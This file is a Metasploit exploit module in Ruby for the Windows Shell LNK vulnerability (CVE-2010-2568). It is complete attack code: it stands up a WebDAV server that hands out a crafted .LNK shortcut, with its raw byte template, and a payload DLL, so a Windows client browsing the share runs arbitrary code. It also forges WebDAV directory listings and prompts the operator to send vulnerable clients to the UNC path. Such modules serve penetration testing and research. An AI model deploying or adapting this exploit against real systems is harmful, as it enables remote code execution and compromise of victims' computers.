##
# $Id: ms10_xxx_windows_shell_lnk_execute.rb 9869 2010-07-19 22:36:26Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	#
	# This module acts as an HTTP server
	#
	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'			=> 'Microsoft Windows Shell LNK Code Execution',
			'Description'	=> %q{
				This module exploits a vulnerability in the handling of Windows
			Shortcut files (.LNK) that contain an icon resource pointing to a
			malicious DLL. This module creates a WebDAV service that can be used
			to run an arbitrary payload when accessed as a UNC path.

			},
			'Author'		=>
				[
					'hdm',   # Module itself
					'jduck', # WebDAV implementation
					'B_H'    # Clean LNK template
				],
			'License'		=> MSF_LICENSE,
			'Version'		=> '$Revision: 9869 $',
			'References'	=>
				[
					['CVE', '2010-2568'],
					['URL', 'http://www.microsoft.com/technet/security/advisory/2286198.mspx'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'		=>
				{
					'Space'	=> 2048,
				},
			'Platform'		=> 'win',
			'Targets'		=>
				[
					[ 'Automatic',	{ } ]
				],
			'DisclosureDate' => 'Jun 09 2010',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptPort.new(	'SRVPORT',		 [ true, "The daemon port to listen on (do not change)", 80 ]),
				OptString.new(	'URIPATH',		 [ true, "The URI to use (do not change).", "/" ]),
			], self.class)

		deregister_options('SSL', 'SSLVersion') # Just for now
	end

	def on_request_uri(cli, request)

		case request.method
		when 'OPTIONS'
			process_options(cli, request)
		when 'PROPFIND'
			process_propfind(cli, request)
		when 'GET'
			process_get(cli, request)
		else
			print_error("Unexpected request method encountered: #{request.method}")
		end

	end

	def process_get(cli, request)

		myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
		webdav = "\\\\#{myhost}\\"

		if (request.uri =~ /\.dll$/i)
			print_status "Sending DLL payload #{cli.peerhost}:#{cli.peerport} ..."
			return if ((p = regenerate_payload(cli)) == nil)

			data = Msf::Util::EXE.to_win32pe_dll(framework, p.encoded)
			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
			return
		end

		if (request.uri =~ /\.lnk$/i)
			print_status "Sending LNK file to #{cli.peerhost}:#{cli.peerport} ..."
			return if ((p = regenerate_payload(cli)) == nil)

			data = generate_link("#{webdav}#{@exploit_base}\\#{@exploit_dll}")

			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
			return
		end

		print_status "Sending UNC redirect to #{cli.peerhost}:#{cli.peerport} ..."
		resp = create_response(301, "Moved")
		resp["Location"] = "#{webdav}#{@exploit_base}\\"
		resp.body = ""
		resp['Content-Type'] = 'text/xml'
		send_response(resp)
	end

	#
	# OPTIONS requests sent by the WebDav Mini-Redirector
	#
	def process_options(cli, request)
		print_status("Responding to WebDAV OPTIONS request from #{cli.peerhost}:#{cli.peerport}")
		headers = {
			'MS-Author-Via' => 'DAV',
#			'DASL'          => '<DAV:sql>',
#			'DAV'           => '1, 2',
			'Allow'         => 'OPTIONS, GET, PROPFIND',
			'Public'        => 'OPTIONS, GET, PROPFIND'
		}
		resp = create_response(207, "Multi-Status")
		resp.body = ""
		resp['Content-Type'] = 'text/xml'
		cli.send_response(resp)
	end

	#
	# PROPFIND requests sent by the WebDav Mini-Redirector
	#
	def process_propfind(cli, request)
		path = request.uri
		print_status("Received WebDAV PROPFIND request from #{cli.peerhost}:#{cli.peerport} #{path}")
		body = ''

		my_host   = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
		my_uri    = "http://#{my_host}/"

		if path =~ /\.dll$/i
			# Response for the DLL
			print_status("Sending DLL multistatus for #{path} ...")
			body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{@exploit_dll}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|

			resp = create_response(207, "Multi-Status")
			resp.body = body
			resp['Content-Type'] = 'text/xml'
			cli.send_response(resp)
			return
		end

		if path =~ /\.lnk$/i
			# Response for the DLL
			print_status("Sending DLL multistatus for #{path} ...")
			body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{@exploit_lnk}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getcontentlength>#{rand(0x100)+128}</lp1:getcontentlength>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>shortcut</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|

			resp = create_response(207, "Multi-Status")
			resp.body = body
			resp['Content-Type'] = 'text/xml'
			cli.send_response(resp)
			return
		end

		if path !~ /\/$/

			if path.index(".")
				print_status("Sending 404 for #{path} ...")
				resp = create_response(404, "Not Found")
				resp['Content-Type'] = 'text/html'
				cli.send_response(resp)
				return
			else
				print_status("Sending 301 for #{path} ...")
				resp = create_response(301, "Moved")
				resp["Location"] = path + "/"
				resp['Content-Type'] = 'text/html'
				cli.send_response(resp)
				return
			end
		end

		print_status("Sending directory multistatus for #{path} ...")
		body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
	<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
		<D:href>#{path}</D:href>
		<D:propstat>
			<D:prop>
				<lp1:resourcetype><D:collection/></lp1:resourcetype>
				<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
				<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
				<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
				<D:supportedlock>
					<D:lockentry>
						<D:lockscope><D:exclusive/></D:lockscope>
						<D:locktype><D:write/></D:locktype>
					</D:lockentry>
					<D:lockentry>
						<D:lockscope><D:shared/></D:lockscope>
						<D:locktype><D:write/></D:locktype>
					</D:lockentry>
				</D:supportedlock>
				<D:lockdiscovery/>
				<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
			</D:prop>
		<D:status>HTTP/1.1 200 OK</D:status>
	</D:propstat>
</D:response>
|


		subdirectory = %Q|
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{Rex::Text.rand_text_alpha(6)}/</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
|

		files = %Q|
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{@exploit_dll}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>

<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{@exploit_lnk}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>
<lp1:getcontentlength>#{rand(0x100)+128}</lp1:getcontentlength>
<lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>shortcut</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
|
		if request["Depth"].to_i > 0
			if path.scan("/").length < 2
				body << subdirectory
			else
				body << files
			end
		end

		body << "</D:multistatus>"

		body.gsub!(/\t/, '')

		# send the response
		resp = create_response(207, "Multi-Status")
		resp.body = body
		resp['Content-Type'] = 'text/xml; charset="utf8"'
		cli.send_response(resp)
	end

	def generate_link(unc)
		[ 0x4c, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0xff, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0x14, 0x00, 0x1f, 0x00, 0xe0, 0x4f,
		0xd0, 0x20, 0xea, 0x3a, 0x69, 0x10, 0xa2, 0xd8, 0x08, 0x00, 0x2b, 0x30,
		0x30, 0x9d, 0x14, 0x00, 0x2e, 0x1e, 0x20, 0x20, 0xec, 0x21, 0xea, 0x3a,
		0x69, 0x10, 0xa2, 0xdd, 0x08, 0x00, 0x2b, 0x30, 0x30, 0x9d, 0x0c, 0x01,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6a,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ].pack("C*") +
		unc.unpack("C*").pack("v*") + "\x00\x00"
	end

	def exploit

		myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST']

		@exploit_unc  = "\\\\#{myhost}\\"
		@exploit_base = rand_text_alpha(rand(8)+4)
		@exploit_lnk  = rand_text_alpha(rand(8)+4) + ".lnk"
		@exploit_dll  = rand_text_alpha(rand(8)+4) + ".dll"

		if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'
			raise RuntimeError, 'Using WebDAV requires SRVPORT=80 and URIPATH=/'
		end

		print_status("")
		print_status("Send vulnerable clients to #{@exploit_unc}#{@exploit_base}\\")
		print_status("")
		super
	end
end

